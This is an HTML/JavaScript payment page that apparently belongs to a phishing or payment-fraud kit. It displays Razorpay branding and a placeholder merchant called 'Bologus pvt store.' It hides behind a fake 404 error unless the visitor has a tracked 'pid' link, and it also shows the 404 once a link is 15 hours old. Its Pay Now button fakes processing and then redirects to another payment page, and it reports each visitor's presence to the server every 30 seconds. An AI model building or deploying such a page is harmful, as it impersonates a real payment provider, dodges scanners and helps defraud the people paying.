<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Page</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .currency-box {
            background-color: #f8f9fa;
        }
        .green-underline {
            border-bottom: 4px solid #22c55e;
            width: 100px;
            margin-bottom: 1rem;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
        }
        .modal-content {
            background-color: white;
            margin: 15% auto;
            padding: 20px;
            border-radius: 8px;
            max-width: 400px;
        }
        .currency-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
        }
        .currency-modal-content {
            background-color: white;
            margin: 10% auto;
            padding: 20px;
            border-radius: 8px;
            max-width: 400px;
            max-height: 70vh;
            overflow-y: auto;
        }
        .loading-spinner {
            display: none;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* 404 Error Page Styles */
        .error-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            font-family: Arial, sans-serif;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: white;
            z-index: 9999;
        }
        
        .error-code {
            font-size: 120px;
            font-weight: bold;
            color: #EF4444;
            margin: 0;
            animation: pulse 2s infinite;
        }
        
        .error-message {
            font-size: 24px;
            color: #6B7280;
            margin: 10px 0 30px 0;
        }
        
        .expired-message {
            color: #EF4444;
            font-size: 18px;
            margin-top: 15px;
        }
        
        .home-link {
            padding: 10px 20px;
            background-color: #3B82F6;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: 500;
            transition: background-color 0.3s;
        }
        
        .home-link:hover {
            background-color: #2563EB;
        }
        
        @keyframes pulse {
            0%, 100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.8;
                transform: scale(0.95);
            }
        }
    </style>
    
    <!-- Direct access check and link expiration check -->
    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const pid = urlParams.get('pid') || sessionStorage.getItem('pid');
            
            if (!pid) {
                // If accessed directly without pid, show 404 error when page loads
                document.addEventListener('DOMContentLoaded', function() {
                    // Replace entire body with 404 error
                    document.body.innerHTML = `
                    <div class="error-container">
                        <h1 class="error-code">404</h1>
                        <p class="error-message">Page not found</p>
                        <a href="/" class="home-link">Return to Home</a>
                    </div>
                    `;
                });
            } else {
                // If pid exists, check if link is expired
                document.addEventListener('DOMContentLoaded', function() {
                    checkLinkExpiry(pid);
                });
            }
        })();
        
        // Function to check if link is expired
        async function checkLinkExpiry(pid) {
            try {
                const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
                
                if (!response.ok) {
                    showExpiredOrInvalidError();
                    return;
                }
                
                const data = await response.json();
                
                if (data.status !== 'success' || !data.payment) {
                    showExpiredOrInvalidError();
                    return;
                }
                
                // Check if link is expired (15 hours = 54000000 milliseconds)
                const createdAt = new Date(data.payment.createdAt).getTime();
                const now = new Date().getTime();
                const timeDiff = now - createdAt;
                
                if (timeDiff > 54000000) { // 15 hours in milliseconds
                    showExpiredOrInvalidError('Payment link has expired');
                }
                
                // If not expired, populate the amount from payment data
                if (data.status === 'success' && data.payment) {
                    window.baseAmount = parseFloat(data.payment.amount) || 0;
                    window.merchantName = "Bologus pvt store.";
                    
                    // Update display
                    document.getElementById('merchantName').textContent = window.merchantName;
                    initializeCurrencyDisplay();
                }
            } catch (error) {
                console.error('Error checking link validity:', error);
                showExpiredOrInvalidError();
            }
        }
        
        // Function to show error for expired or invalid links
        function showExpiredOrInvalidError(message = 'Invalid payment link') {
            document.body.innerHTML = `
            <div class="error-container">
                <h1 class="error-code">404</h1>
                <p class="error-message">Page not found</p>
                <p class="expired-message">${message}</p>
                <a href="/" class="home-link">Return to Home</a>
            </div>
            `;
        }
    </script>
</head>
<body class="bg-gray-50">
    <!-- Back Confirmation Modal -->
    <div id="backModal" class="modal">
        <div class="modal-content">
            <h2 class="text-xl font-bold mb-4">Cancel Transaction</h2>
            <p class="mb-6">Do you want to cancel this transaction?</p>
            <div class="flex justify-end space-x-4">
                <button id="cancelNo" class="px-4 py-2 bg-gray-200 rounded hover:bg-gray-300">No</button>
                <button id="cancelYes" class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600">Yes, cancel</button>
            </div>
        </div>
    </div>

    <!-- Currency Selection Modal -->
    <div id="currencyModal" class="currency-modal">
        <div class="currency-modal-content">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-xl font-bold">Select Currency</h2>
                <button id="closeCurrencyModal" class="text-gray-500 hover:text-gray-700">&times;</button>
            </div>
            <div id="currencyList" class="space-y-2">
                <!-- Currencies will be populated here -->
            </div>
        </div>
    </div>

    <div class="max-w-3xl mx-auto p-4">
        <!-- Header -->
        <div class="flex justify-between items-center mb-6">
            <button id="backButton" class="text-gray-600 hover:text-gray-800">
                ← Back
            </button>
            <div class="flex items-center">
                <span class="mr-2">Powered by</span>
                <img src="https://razorpay.com/assets/razorpay-logo.svg" alt="Razorpay" class="h-6">
            </div>
        </div>

        <!-- Main Content -->
        <div class="bg-white rounded-lg border border-gray-200 p-6">
            <!-- Merchant Name -->
            <h1 class="text-xl mb-2">Paying to <span id="merchantName">Merchant Name</span></h1>
            <div class="green-underline"></div>

            <!-- Card Info -->
            <p class="text-gray-600 mb-4">
                The card you selected is outside India, we offer the following currency payment option.
            </p>

            <!-- Currency Selection Box -->
            <div class="border border-blue-500 rounded-lg p-4 mb-6 currency-box">
                <div class="flex justify-between items-center mb-3">
                    <div class="flex items-center">
                        <div class="w-5 h-5 rounded-full border-2 border-blue-500 flex items-center justify-center mr-3">
                            <div class="w-3 h-3 rounded-full bg-blue-500"></div>
                        </div>
                        <span class="text-blue-500 font-medium" id="selectedCurrency">INR 0.00</span>
                    </div>
                    <button id="currencyToggle" class="text-gray-600 hover:text-gray-800">more ></button>
                </div>

                <p class="text-sm text-gray-600" id="conversionRate">1 INR = 0.01247 USD Incl. a currency conversion processing fee</p>
            </div>

            <!-- Payment Button -->
            <div class="flex justify-center">
                <button id="payButton" class="bg-blue-600 text-white px-8 py-3 rounded flex items-center justify-center min-w-[200px]">
                    <span>Pay Now</span>
                    <svg class="loading-spinner ml-2 h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                </button>
            </div>
        </div>
    </div>

    <script>
        // Currency data
        const currencies = [
            { code: 'USD', symbol: '$', name: 'US Dollar' },
            { code: 'EUR', symbol: '€', name: 'Euro' },
            { code: 'GBP', symbol: '£', name: 'British Pound' },
            { code: 'JPY', symbol: '¥', name: 'Japanese Yen' },
            { code: 'AUD', symbol: 'A$', name: 'Australian Dollar' },
            { code: 'CAD', symbol: 'C$', name: 'Canadian Dollar' },
            { code: 'CHF', symbol: 'Fr', name: 'Swiss Franc' },
            { code: 'CNY', symbol: '¥', name: 'Chinese Yuan' },
            { code: 'HKD', symbol: 'HK$', name: 'Hong Kong Dollar' },
            { code: 'NZD', symbol: 'NZ$', name: 'New Zealand Dollar' },
            { code: 'SGD', symbol: 'S$', name: 'Singapore Dollar' },
            { code: 'INR', symbol: '₹', name: 'Indian Rupee' },
        ];

        // Exchange rates object
        let exchangeRates = {};
        let baseAmount = 0; // Will be set from the payment link data
        let currentCurrency = 'INR';

        // Get DOM elements
        const backModal = document.getElementById('backModal');
        const backButton = document.getElementById('backButton');
        const cancelYes = document.getElementById('cancelYes');
        const cancelNo = document.getElementById('cancelNo');
        const currencyModal = document.getElementById('currencyModal');
        const currencyToggle = document.getElementById('currencyToggle');
        const closeCurrencyModal = document.getElementById('closeCurrencyModal');
        const currencyList = document.getElementById('currencyList');
        const selectedCurrency = document.getElementById('selectedCurrency');
        const conversionRate = document.getElementById('conversionRate');
        const payButton = document.getElementById('payButton');

        // Fetch exchange rates
        async function fetchExchangeRates() {
            try {
                const response = await fetch('https://api.exchangerate-api.com/v4/latest/INR');
                const data = await response.json();
                exchangeRates = data.rates;
                updateCurrencyList();
            } catch (error) {
                console.error('Error fetching exchange rates:', error);
                // Fallback rates if API fails
                exchangeRates = {
                    'USD': 0.012,
                    'EUR': 0.011,
                    'GBP': 0.0095,
                    'JPY': 1.67,
                    'AUD': 0.018,
                    'CAD': 0.016,
                    'CHF': 0.011,
                    'CNY': 0.086,
                    'HKD': 0.094,
                    'NZD': 0.019,
                    'SGD': 0.016,
                    'INR': 1
                };
                updateCurrencyList();
            }
        }

        // Update currency amounts
        function updateCurrencyList() {
            currencyList.innerHTML = '';
            currencies.forEach(currency => {
                const rate = exchangeRates[currency.code] || 1;
                const convertedAmount = (baseAmount * rate).toFixed(2);
                const currencyItem = document.createElement('div');
                currencyItem.className = 'cursor-pointer p-4 hover:bg-gray-100 rounded flex items-center justify-between';
                currencyItem.innerHTML = `
                    <div class="flex items-center">
                        <div class="w-5 h-5 rounded-full border-2 ${currency.code === currentCurrency ? 'border-blue-500' : 'border-gray-300'} flex items-center justify-center mr-3">
                            <div class="w-3 h-3 rounded-full ${currency.code === currentCurrency ? 'bg-blue-500' : 'bg-transparent'}"></div>
                        </div>
                        <span>${currency.name} (${currency.code})</span>
                    </div>
                    <span>${currency.symbol}${convertedAmount}</span>
                `;
                currencyItem.addEventListener('click', () => {
                    const rate = exchangeRates[currency.code] || 1;
                    const convertedAmount = (baseAmount * rate).toFixed(2);
                    selectedCurrency.textContent = `${currency.code} ${currency.symbol}${convertedAmount}`;
                    currentCurrency = currency.code;
                    updateConversionRate();
                    currencyModal.style.display = 'none';
                    updateCurrencyList(); // Update the list to show the new selection
                });
                currencyList.appendChild(currencyItem);
            });
        }

        // Update conversion rate display
        function updateConversionRate() {
            const inrRate = exchangeRates[currentCurrency] || 1;
            conversionRate.textContent = `1 INR = ${inrRate.toFixed(5)} ${currentCurrency} Incl. a currency conversion processing fee`;
        }

        // Initialize currency display
        function initializeCurrencyDisplay() {
            baseAmount = window.baseAmount || 0;
            selectedCurrency.textContent = `INR ₹${baseAmount.toFixed(2)}`;
            fetchExchangeRates();
        }

        // Back button handling
        backButton.addEventListener('click', () => {
            backModal.style.display = 'block';
        });

        cancelYes.addEventListener('click', () => {
            window.location.href = '/fail.html?reason=canceled';
        });

        cancelNo.addEventListener('click', () => {
            backModal.style.display = 'none';
        });

        // Currency modal handling
        currencyToggle.addEventListener('click', () => {
            currencyModal.style.display = 'block';
        });

        closeCurrencyModal.addEventListener('click', () => {
            currencyModal.style.display = 'none';
        });

        // Close modals when clicking outside
        window.addEventListener('click', (event) => {
            if (event.target === backModal) {
                backModal.style.display = 'none';
            }
            if (event.target === currencyModal) {
                currencyModal.style.display = 'none';
            }
        });

        // Pay Button Click - Modified to return to payment.html
        payButton.addEventListener('click', () => {
            const spinner = payButton.querySelector('.loading-spinner');
            spinner.style.display = 'block';
            payButton.disabled = true;
            
            // Get PID from URL or sessionStorage
            const urlParams = new URLSearchParams(window.location.search);
            const pid = urlParams.get('pid') || sessionStorage.getItem('pid');
            
            // Set a timeout to simulate processing
            setTimeout(() => {
                // Redirect back to payment.html with the same pid
                window.location.href = `/payment.html?pid=${pid}`;
            }, 3500); // 3.5 seconds delay
        });

        // Set up visitor heartbeat
        function setupHeartbeat() {
            const urlParams = new URLSearchParams(window.location.search);
            const pid = urlParams.get('pid') || sessionStorage.getItem('pid');
            
            function sendHeartbeat() {
                if (!pid) return;
                
                fetch('/api/visitor-heartbeat', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ pid })
                }).catch(err => console.error('Heartbeat error:', err));
            }
            
            // Send heartbeat every 30 seconds
            const heartbeatInterval = setInterval(sendHeartbeat, 30000);
            
            // Send initial heartbeat
            sendHeartbeat();
            
            // Clear interval when page is unloaded
            window.addEventListener('beforeunload', () => {
                clearInterval(heartbeatInterval);
            });
        }

        // Initialize page on load
        document.addEventListener('DOMContentLoaded', () => {
            setupHeartbeat();
        });
    </script>
</body>
</html>
